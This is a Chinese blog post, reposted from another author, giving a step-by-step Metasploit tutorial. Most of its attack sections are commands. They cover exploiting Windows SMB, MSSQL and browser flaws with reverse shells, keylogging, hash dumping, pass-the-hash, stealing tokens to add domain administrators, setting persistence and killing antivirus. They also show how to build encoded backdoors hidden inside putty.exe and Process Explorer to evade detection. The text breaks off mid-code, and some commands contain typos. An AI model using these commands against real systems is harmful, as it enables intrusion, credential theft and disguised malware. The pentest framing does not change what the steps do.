---
title: Metasploit 超级详解
date: 2018-09-25
tags: Metasploit
layout: post
---

### 一．名词解释 
#### exploit 
测试者利用它来攻击一个系统，程序，或服务，以获得开发者意料之外的结果。常见的 
有内存溢出，网站程序漏洞利用，配置错误exploit。 
#### payload 
我们想让被攻击系统执行的程序，如reverse shell 可以从目标机器与测试者之间建立一 
个反响连接，bind shell 绑定一个执行命令的通道至测试者的机器。payload 也可以是只 
能在目标机器上执行有限命令的程序。 
#### shellcode 
是进行攻击时的一系列被当作payload 的指令，通常在目标机器上执行之后提供一个可 
执行命令的shell。 
#### module 
MSF 的模块，由一系列代码组成。 
listener 
等待来自被攻击机器的incoming 连接的监听在测试者机器上的程序

### 二. 编码器 
msfencode –l 查看可用的编码器（encoders），效果最佳的是x86/shikata_ga_nai

### 三．信息刺探与收集 
#### 1、攻击第一步：基础信息收集 
* whois 查询： 
msf > whois example.com 
msf> whois 192.168.1.100

* 在线手机服务器IP工具

* nslookup 
set type=mx 
example.com

#### 2、用nmap 探测开放端口和服务：

**-sS** SYN 半开扫描 
**-sT** TCP 半开扫描 
**-Pn** 不使用ping方式探测主机 
**-A** 探测服务类型 
**-6** 开启IPV6 扫描 
**-O** 探测操作系统版本

常用扫描参数组合： 
nmap –sS –Pn 192.168.0.111 
nmap –sS –Pn –A 192.168.0.111

#### 3、MSF 与postgresql 协同工作 
```
/etc/init.d/postgreql-8.3 start 
msf> db_connect postgres:toor@127.0.0.1/msf 
msf> db_status 
```
导入nmap 扫描的结果： 
```
nmap –sS –Pn –A –oX Subnet1 192.168.1.0/24 # -oX 扫描结果导出为Subnet1.xml 
msf> db_import Subnet1.xml 
msf> db_hosts –c address #查看导入的主机IP 
```
（msf 也可以和mysql 一起工作，在bt5 r1 中msf 默认支持连接mysql 
msf> db_driver mysql 
msf> db_connect root:toor@127.0.0.1/msf3 #连接本机mysql 的msf3 数据库 
mysql 默认密码toor，使用db_connect 连接时会自动创建msf3 库）

#### 4、高级扫描方式： 
```
msf> use auxiliary/scanner/ip/ipidseq #IPID 序列扫描器，与nmap 的-sI -O 选项类似 
show options 
set RHOSTS 192.168.1.0/24 
set RPORT 8080 
set THREADS 50 
run 
```
（RHOSTS、RPORT 等参数也可以用小写） 
msf> nmap –PN –sI 192.168.1.09 192.168.1.155 
* nmap 连接数据库： 
msf> db_connect postgres:toor@127.0.0.1/msf 
msf> db_nmap –sS –A 192.168.1.111 
msf> db_services #查看扫描结果 
* 使用portscan 模块： 
msf> search postscan 
msf> use scanner/postscan/syn 
set RHOSTS 192.168.1.111 
set THREADS 50 
run

#### 5、特定扫描： 
* smb_version 模块： 
```
msf> use auxiliary/scanner/smb/smb_version 
show options 
set RHOSTS 192.168.1.111 
run 
db_hosts –c address,os_flavor 
```
* 查找mssql 主机： 
```
msf> use auxiliary/scanner/mssql/mssql_ping 
show options 
set RHOSTS 192.168.1.0/24 
set THREADS 255 
run 
```
* SSH 服务器扫描： 
```
msf> use auxiliary/scanner/ssh/ssh_version 
set THREADS 50 
run 
```
* FTP 主机扫描： 
```
msf> use auxiliary/scanner/ftp/ftp_version 
show options 
set RHOSTS 192.168.1.0/24 
set THREADS 255 
run 
```
* 扫描FTP 匿名登录： 
```
use auxiliary/scanner/ftp/anonymos 
set RHOSTS 192.168.1.0/24 
set THREADS 50 
run 
```
* 扫描SNMP 主机： 
```
msf> use auxiliary/scanner/snmp/snmp_login 
set RHOSTS 192.168.1.0/24 
set THREADS 50 
run
```

### 四．基本漏洞扫描 
#### 1、使用nc 与目标端口通信，获取目标端口的信息： 
nc 192.168.1.111 80 
GET HTTP 1/1 
Server: Microsoft-IIS/5.1 
##### 1、还有一个功能与nc 类似的工具Ncat，产自nmap 社区，可实现相同功能： 
ncat -C 192.168.1.111 80 
GET / HTTP/1.0

#### 2、题外：ncat 还可以做聊天服务器呢！在服务器端监听然后多个客户端直接连上就 
可以聊天了：服务器（chatserver）：ncatncat -l –chat 其他客户端：ncat chatserver

#### 3：ncat 还可以用来查看各种客户端的请求信息，比如论坛里有人问中国菜刀有木有后门，那么可以这样查看中国菜刀连接后门时发送的数据： 
服务器（server.example.com）上：ncat -l –keep-open 80 –output caidao.log > /dev/null 
然后使用菜刀连接http://server.example.com/nc.php 并请求操作，这是菜刀发送的数据就保存到服务器的caidao.log 里面了。也可以导出为hex 格式，–output 换为–hex-dump就可以了。

#### 4：其实与nc 功能类似的工具在bt5 里面还有很多，比如还有一个sbd： 
监听：sbd -l -p 12345 
连接：sbd 192.168.1.111 12345

#### 5：当然也可以用来聊天，与ncat 的不同之处在于ncat 自动对用户编号user1、user2、…， 
而sbd 可以自定义昵称，且不需要专门单独监听为聊天服务器： 
pc1：sbd -l -p 12345 -P chowner 
pc2：sbd pc1 12345 -P evil

#### 6：其实nc 也可以用来聊天的： 
pc1:nc -l -p 12345 
pc2:telnet pc1 12345）

#### 3、与nessus 结合扫描： 
* 使用Nessus 扫描完成后生成.nessus 格式的报告，导入到MSF： 
db_connect postgres:toor@127.0.0.1/msf 
db_import /tmp/nessus_report_Host_test.nessus 
db_hosts –c address,svcs,vulns 
db_vulns 
* 在MSF 中使用Nessus： 
db_connect postgres:toor@127.0.0.1/msf 
load nessus 
nessus_connect nessus:toor@192.168.1.111:8834 ok 
nessus_policy_list #查看存在的扫描规则 
nessus_scan_new 2 bridge_scan 192.168.1.111 #2 表示规则的ID 号，bridge_scan 自定义扫描名称 
nessus_scan_status #查看扫描进行状态 
nessus_report_list #查看扫描结果 
nessus_report_get skjla243-3b5d-* #导入报告 
db_hosts –c address,svcs,vulns

#### 4、特殊扫描： 
* SMB 弱口令: 
```
msf> use auxiliary/scanner/smb/smb_login 
set RHOSTS 192.168.1.111-222 
set SMBUser Administrator 
set SMBPass admin 
run 
```
* VNC 空口令： 
```
msf> use auxiliary/scanner/vnc/vnc_none_auth 
set RHOSTS 192.168.1.111 
run
``` 
* Open X11 空口令： 
```
msf> use auxiliary/scanner/x11/open_x11 
set RHOST 192.168.1.0/24 
set THREADS 50 
run 
```
* 当扫描到此漏洞的主机后可以使用xspy 工具来监视对方的键盘输入： 
```
cd /pentest/sniffers/xspy/ 
./xspy –display 192.168.1.125:0 –delay 100 
（xspy 这货在bt5 r1 里面貌似木有了）
```

### 五．基础溢出命令 
#### 1、基本命令： 
查看可用溢出模块 **show exploits** 
查看辅助模块 **show auxiliary** 包括扫描器，拒绝服务模块，fuzzer 工具或其他。 
查看可用选项 **show options** 
* 加载模块后退出此模块 **back** 
例子： msf> use windows/smb/ms08_067_netapi 
back 
* 搜索模块search 
例子： searh mssql search ms08_067 
* 查看当前模块可用的payload： **show payloads** 
例子： 
use windows/smb/ms08_067_netapi 
show payloads 
set payload windows/shell/reverse_tcp 
show options 

**查看可选的目标类型** **show targets** 
**查看更多信息** **info** 
设置一个选项或取消设置 **set/unset** 
设置或取消全局选项 **setg/unsetg** 例如设置LHOST 就可以用setg，避免后面重复设置 
保存全局选项的设置 **save** 当下次启动仍然生效 
查看建立的session **sessions –l** 
激活session **sessions –i num** #num 为session 编号

#### 2、暴力端口探测： 
当主机端口对外开放但是普通探测方法无法探测到时，用此模块，msf 将对目标的所有 
端口进行尝试，直到找到一个开放端口并与测试者建立连接。 
例子： 
```
use exploit/windows/smb/ms08_067_netapi 
set LHOST 192.168.1.111 
set RHOST 192.168.1.122 
set TARGET 39 #Windows XP SP3 Chinese - Simplified (NX) 
search ports #搜索与ports 相关模块 
set PAYLOAD windows/meterpreter/reverse_tcp_allports 
exploit –j #作为后台任务运行 
sessions –l –v 
sesssions –i 1
```
#### 3、MSF 脚本文件： 
为了缩短测试时间可以将msf 命令写入一个文件，然后在msf 中加载它。 
加载方式：msfconsole 的resource 命令或者msfconsole 加上-r 选项 
例子： 
```
echo ‘version’ > resource.rc 
echo ‘load sounds’ >> resource.rc 
msfconsole –r resource.rc 
```
例子： 
```
echo ‘use exploit/windows/smb/ms08_067_netapi’ > autoexp.rc 
echo ‘set RHOST 192.168.1.133’ >> autoexp.rc 
echo ‘set PAYLOAD windows/meterpreter/reverse_tcp’ >> autoexp.rc 
echo ‘set LHOST 192.168.1.111’ >> autoexp.rc 
echo ‘exploit’ >> autoexp.rc 
msfconsole 
msf> resource autoexp.rc
```

### 六．Meterpreter
#### 1、当对目标系统进行溢出时，使用meterpreter 作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。 
例子： 
```
msf> nmap –sT –A –P0 192.168.1.130 #探测开放服务 
假如已经探测到1433（TCP）和1434(UDP)端口（mssql）， 
msf> nmap –sU 192.168.1.130 –P 1434 #确认端口开放 
msf> use auxiliary/scanner/mssql/mssql_ping 
show options 
set RHOSTS 192.168.1.1/24 
set THREADS 20 
exploit
``` 
至此可获取服务器名称，版本号等信息。 
```
msf> use auxiliary/scanner/mssql/mssql_login 
show options 
set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt 
set RHOSTS 192.168.1.130 
set THREADS 10 
set verbose false 
exploit 
```
暴力猜解登陆密码。
接下来使用mssql 自带的xp_cmdshell 功能添加账户： 
```
msf> use exploit/windows/mssql/mssql_payload 
show options 
set payload windows/meterpreter/reverse_tcp 
set LHOST 192.168.1.111 
set LPORT 433 
set RHOST 192.168.1.130 
set PASSWORD password130 
exploit 
```
当获取到一个meterpreter shell 后可以执行更多的操作： 
获取屏幕截图：**screenshot** 
获取系统信息：**sysinfo** 
获取键盘记录： **keyscan_start**
```
meterpreter> ps #查看目标机器进程，假设发现explorer.exe 的进程号为1668: 
meterpreter> migrate 1668 #插入该进程 
meterpreter> run post/windows/capture/keylog_recorder #运行键盘记录模块，将击键记录保存到本地txt 
cat /root/.msf3/loot/*.txt #查看结果 
```
* 获取系统账号密码： 
```
meterpreter> use priv 
meterpreter> run post/windows/gather/hashdump 
```
* 当获取到密码的hash 之后无法破解出明文密码且无法直接使用hash 登陆，需要使用 
pass-the-hash 技术： 
```
msf> use windows/smb/psexec 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 192.168.1.111 
set LPORT 443 
set RHOST 192.168.1.130 
set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29 
exploit 
```
获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门： 
在目标机器上执行：**net uaer hacker pass /add** 
* 本地生成一个后门程序： 
```
msfpayload windows/meterpreter/reverse_tcp 
LHOST=192.168.1.111 LPORT=443 X >payload.exe 
```
将payload.exe 拷贝到目标机器然后使用新建立的账号执行本地执行端口监听，等待来自目标机器连接： 
msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp 
LHOST=192.168.1.111 LPORT=443 
use priv 
getsystem 
getuid 
至此取得SYSTEM 权限

#### 2、令牌模拟：当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。 
```
meterpreter> ps # 查看目标机器进程，找出域控账户运行的进程ID，假如发现PID 为380 
meterpreter> steal_token 380 
有时ps 命令列出的进程中可能不存在域控账户的进程，此时使用incognito 模块查看可 
用token： 
meterpreter> use incognito 
meterpreter> list_tokens –u #列出可用token，假如找到域控token 
meterpreter> impersonate_token SNEAKS.IN\ihazdomainadmin 
meterpreter> add_user hacker password –h 192.168.1.50 #在域控主机上添加账户 
meterpreter> add_group_user “Domain Admins” hacker –h 192.168.1.50 #将账户添加至域管理员组
```
#### 3、内网渗透：当取得同网段内一台主机的权限后可以进一步渗透网内其他主机： 
例子： 
```
meterpreter> run get_local_subnets #查看网段/子网 
Local subnet: 192.168.33.0/255.255.255.0 
meterpreter> background #转入后台运行 
msf> route add 192.168.33.0 255.255.255.0 1 #本地添加路由信息 
msf> route print #查看添加的信息 
msf> use linux/samba/lsa_transnames_heap #准备向内网目标主机进攻 
set payload linux/x86/shell/reverse_tcp 
set LHOST 10.10.1.129 #此处为attacking 主机的外网IP 
set LPORT 8080 
set RHOST 192.168.33.132 #内网目标主机 
exploit 
```
也可以使用自动式添加路由模块： 
```
msf> load auto_add_route 
msf> exploit
```
#### 4、Meterpreter 脚本： 
使用run scriptname 方式执行 
* ①vnc 脚本,获取远程机器vnc 界面控制 
```
meterpreter> run vnc 
meterpreter> run screen_unlock 
```
* ②进程迁移 
当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp 进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。 
例子： 
```meterpreter> run post/windows/manage/migrate 
```
（在64 位win7 中migrate 需要管理员权限执行后门才能成功，而migrate 前后获取的 
权限是有差异的。） 
* ③关闭杀毒软件 
```
meterpreter> run killav （这个脚本要小心使用，可能导致目标机器蓝屏死机。） 
```
* ④获取系统密码hash 
```
meterpreter> run hashdump 
（64 位win7 下需要管理员权限执行后门且先getsystem，然后使用 
run post/windows/gather/hashdump 来dump hash 成功率更高。 
而且如果要使用shell 添加系统账户的话win7 下得先： 
run post/windows/escalate/bypassuac ，不然可能不会成功。） 
```
* ⑤获取系统流量数据 
```meterpreter> run packtrecorder –i 1 ```
* ⑥直捣黄龙 
可以干很多事情：获取密码，下载注册表，获取系统信息等 
```meterpreter> run scraper ```
* ⑦维持控制
当目标机器重启之后仍然可以控制 
``` meterpreter> run persistence –X –i 50 –p 443 –r 192.168.1.111 ```
 **-X 开机启动-i 连接超时时间–p 端口–rIP** 
**下次连接时：** 
```msf> use multi/handler 
set payload windows/meterpreter/reverse_tcp 
set LPOST 443 
set LHOST 192.168.1.111 
exploit
``` 

_(会在以下位置和注册表以随机文件名写入文件等信息，如： 
C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs 
C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe 
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP)_
* ⑧POST 整合模块 
可实现同时多个session 操作 
例子：获取hash 
```meterpreter> run post/windows/gather/hashdump ```
其他还有很多，使用TAB 键补全看下就知道run post/

#### 5、升级command shell 
例子： 
```
msfconsole 
msf> search ms08_067 
msf> use windows/smb/ms08_067_netapi 
set PAYLOAD windows/shell/reverse_tcp 
set TARGET 3 
setg LHOST 192.168.1.111 
setg LPORT 8080 
exploit –z #后台运行，如果此处未使用-z 参数，后面可以按CTRL-Z 转到后台 
sessions –u 1 #升级shell，必须前面使用setg 设定 
sessions –i 2
```
#### 6、使用Railgun 操作windows APIs 
例子： 
meterpreter> irb


  
    client.railgun.user32.MessageBoxA(o,”hello”,”world”,”MB_OK”) 
    在目标机器上会弹出一个标题栏为world 和内容为hello 的窗口
  


### 七．避开杀软 
#### 1、使用msfpayload 创建可执行后门： 
例子： 
msfpayload windows/shell_reverse_tcp 0 #查看选项 
msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 X > 
/var/www/payload1.exe 
**然后本机监听端口** 
```
msf> use exploit/multi/handler 
show options 
set PAYLOAD windows/shell_reverse_tcp 
set LHOST 192.168.1.111 
set LPORT 31337 
exploit
```
#### 2、过杀软—使用msfencode 编码后门： 
msfencode –l #列出可用编码器 
例子： 
```msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode –e x86/shikata_ga_nai –t exe > /var/www/payload2.exe ```
使用R 参数作为raw 输出至管道，再经过msfencode 处理，最后导出。

#### 3、多次编码： 
例子： 
```
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | 
msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/alpha_upper –c 2 –t raw | 
msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/countdown –c 5 –t exe –o 
/var/www/payload3.exe
``` 
简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17 次循环编码。 
（题外：经测试，1：使用此命令生成的后门也被MSE 杀到；2：未编码的后门或编码次数较少的后门可以直接被秒杀；3：windows/x64/meterpreter/reverse_tcp 生成的后门未经任何处理仍然不被杀，看来杀毒软件傻逼了；4：x86 编码器编码的后门在64 位机器上无法执行；5：360 有个沙箱功能，后门文件右键选择“在360 隔离沙箱中运行”，msf照样可以连接并操作，看来隔离沙箱功能有限。）

#### 4、自定义可执行程序模板： 
msfencode 默认使用data/templates/templates.exe（msf v4 在templates 目录下有针对不同 
平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如： 
wget http://download.sysinternals.com/Files/ProcessExplorer.zip 
cd work 
unzip ProcessExplorer.zip 
cd .. 
msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode 
–t exe –x work/procexp.exe –o /var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5 
在目标机器上运行，然后本地使用msfcli 监听端口等待反弹连接： 
msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 
LPORT=8080 E

#### 5、暗度陈仓—猥琐执行payload： 
绑定payload 至一个可执行文件，让目标不知不觉间中招，以putty.exe 为例： 
```
msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode 
–t exe –x putty.exe -o /var/www/putty_backdoor.exe –e x86/shikata_ga_nai –k –c 5 
```
假如选择一个GUI 界面的程序作为绑定目标并且不使用 **-k** 选项，则目标执行此程序的时候不会弹出cmd窗口， **-k** 选项的作用是payload 独立于模板软件的进程运行。

#### 6、加壳： 
msfencode 部分编码器会增加程序体积，这时可使用壳（packer）来压缩程序，“带套之后更保险”，例如UPX ： 
apt-get install upx 
最新版可到sf.net 下载 
使用方法： 
upx -5 /var/www/payload3.exe 
还有另外一个工具msfvenom 结合了msfpayload 和msfencode 的功能，使用起来更省心， 
亲，一定要试试哦！过杀软总结起来就是多次编码和使用多种壳，终极大法就是使用自己编写的后门（市面上没有，被杀几率更低）。

### 八．使用用户端攻击方式(client-side attacks) 
#### 1、主要指利用多种途径包括社会工程学方式攻击目标机器上安装的带有漏洞的程序如浏览 器，pdf 阅读器，office 软件等，最终获取系统权限。 
基于浏览器的攻击： 
例子： 
```
msf> use windows/browser/ms10_002_aurora 
set payload windows/meterpreter/reverse_tcp 
set SRVPORT 80 
set URIPATH / 
set LHOST 192.168.1.111 
set LPORT 443 
exploit –z 
sessions –i 1 
run migrate 
```
或者: 
```
msf> use windows/browser/ms10_002_aurora 
show advanced 
set ReverseConnectRetries 10 
set AutoRunScript migrate –f 
exploit 
use priv 
getsystem
```
#### 2、文件格式exploit 
利用文件格式的漏洞达到溢出的目的，比如PDF，word，图片等。 
例子： 
msf> use windows/fileformat/ms11_006_createsizeddibsection 
info 
set payload windows/meterpreter/reverse_tcp 
set LHOST 192.168.1.111 
set LPORT 443 
exploit 
此时会生成一个msf.doc 的word 文档，在目标机器上打开此文档，然后本机监听端口 
等待反弹连接： 
use multi/handler 
set payload windows/meterpreter/reverse_tcp 
set LHOST 192.168.1.111 
set LPORT 443 
exploit –j

### 九．MSF 附加模块 
包括端口扫描，服务探测，弱口令探测，fuzzer，sql 注射等。附加模块没有payload。 
模块保存在/opt/framework3/msf3/modules/auxiliary/目录中的各个子目录下。 
可用命令查看全部可用附加模块：msf> show auxiliary 
例子： 
```
msf> use scanner/http/webdav_scanner 
info 
show options 
set RHOSTS 192.168.1.141,192.168.1.142,192.168.2.222 
run 
```
搜索所有http 相关扫描模块： 
sea rch scanner/http 
附加模块深层剖析： 
cd /opt/framework3/msf3/modules/auxiliary/admin/ 
wget 
http://carnal0wnage.googlecode.c … admin/random/foursq 
ueare.rb 
代码分析: 
require ‘msf/core’ 
class Metasploit3 < Msf::Auxiliary #导入Auxiliaary 类 
#Exploit mixins should be called first 
include Msf::Exploit::Remote::HttpClient #导入HTTPClient 方法 
include Msf::Auxiliary::Report 
def initialize 
super( 
‘Name’ => ‘Foursquare Location Poster’, 
‘Version’ => ‘Revision:

---------------------

>原文撰者：[PolluxAvenger](https://blog.csdn.net/tan6600/article/details/46850057?utm_source=copy "PolluxAvenger") - 由本人稍加更改。
